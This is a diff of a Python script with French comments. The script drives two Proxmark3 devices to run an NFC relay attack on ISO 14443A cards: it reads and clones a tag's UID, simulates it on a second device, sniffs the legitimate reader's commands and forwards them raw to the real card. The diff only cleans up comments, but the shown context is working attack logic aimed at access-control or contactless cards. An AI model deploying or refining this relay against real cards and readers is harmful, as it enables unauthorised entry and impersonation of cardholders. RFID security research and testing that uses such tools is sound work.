@@ -2,7 +2,7 @@ import subprocess
 import re
 import time
 
-# Configuration des ports (syntaxe -p selon tes indications)
+# Configuration des ports
 PM3_PATH = "./client/proxmark3.exe"
 PORT_MOLE = "COM9"
 PORT_PROXY = "COM10"
@@ -34,7 +34,7 @@ def pm3_exec_clean(port, command):
 def main_relay():
     print("[*] Démarrage du relais (Mode filtrage activé)...")
 
-    # 1. Identification du tag
+    #Identification du tag
     # On utilise hf 14a info pour cloner l'UID
     print(f"[*] Lecture du tag sur {PORT_MOLE}...")
     res_info = pm3_exec_clean(PORT_MOLE, f"hf 14a info")
@@ -54,20 +54,20 @@ def main_relay():
 
     print(f"[+] UID détecté : {uid}")
 
-    # 2. Simulation sur le Proxy
+    #Simulation sur le Proxy
     print(f"[*] Lancement de la simulation sur {PORT_PROXY}...")
     pm3_exec_clean(PORT_PROXY, f"hf 14a sim -u {uid}")
 
     try:
         while True:
-            # 3. Sniffing du lecteur original
+            #Sniffing du lecteur original
             # On cherche les commandes du lecteur
             reader_data = pm3_exec_clean(PORT_PROXY, "hf 14a sniff")
             
             if reader_data:
                 print(f"[Lecteur] -> {reader_data}")
                 
-                # 4. Transmission au Mole avec les options de tes captures :
+                #Transmission au Mole:
                 # -c pour le CRC, -k pour garder le champ actif
                 tag_res = pm3_exec_clean(PORT_MOLE, f"hf 14a raw -ck {reader_data}")
                 
